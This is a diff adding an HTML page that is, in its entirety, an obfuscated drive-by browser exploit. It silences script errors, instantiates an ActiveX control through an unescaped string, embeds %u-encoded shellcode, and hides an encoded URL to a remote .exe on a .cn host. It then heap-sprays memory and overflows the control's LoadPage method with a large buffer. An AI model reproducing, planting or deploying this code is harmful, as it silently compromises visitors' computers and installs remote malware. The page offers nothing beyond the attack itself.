@@ -1,0 +1,38 @@
+<html>
+<SCRIPT LANGUAGE="JavaScript"> 
+<!-- Hide 
+function killErrors() { 
+return true; 
+} 
+window.onerror = killErrors; 
+// --> 
+</SCRIPT>
+<SCRIPT LANGUAGE="Javascript">
+var zxcvbnmsdfghj ="%3Cobject%20classid%3D%22clsid%3A7F5E27CE-4A5C-11D3-9232-0000B48A05B2%22%20id%3D%27Hello%27%3E%3C/object%3E"
+function bvcx()
+{
+var rfvb;
+rfvb = unescape(zxcvbnmsdfghj);
+document.write(rfvb);
+}
+bvcx();
+// -->
+</SCRIPT>
+<script src=cx.js></script>
+<SCRIPT language="javascript">
+var rb4="%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07%u1011%uba10%ua3bd%ua0a2%uefa1";
+LtJIfo = new window["Array"]();
+Killme = unescape("%u7468%u7074%u2F3A%u772F%u7777%u632E%u7463%u6276%u2E77%u6E63%u622F%u6E65%u2F7A%u6D62%u2E77%u7865%u0065");
+var HelloRabbit=Hellodown+Killme;
+var lvfe90 = 20;
+var uk18GrDd = lvfe90+HelloRabbit.length;
+while (fp9cw17i.length<uk18GrDd) fp9cw17i+=fp9cw17i;
+Er29D0Fg = fp9cw17i.substring(0, uk18GrDd);
+vE1dfq6 = fp9cw17i.substring(0, fp9cw17i.length-uk18GrDd);
+while(vE1dfq6.length+uk18GrDd<0x40000) vE1dfq6 = vE1dfq6+vE1dfq6+Er29D0Fg;
+for (x=0; x<300; x++) LtJIfo[x] = vE1dfq6 + HelloRabbit;
+var buffer = '';
+while (buffer.length < 3092) buffer+="\x0a\x0a\x0a\x0a";
+Hello.LoadPage(buffer ,1 ,1 ,1);
+</script>
+</html>
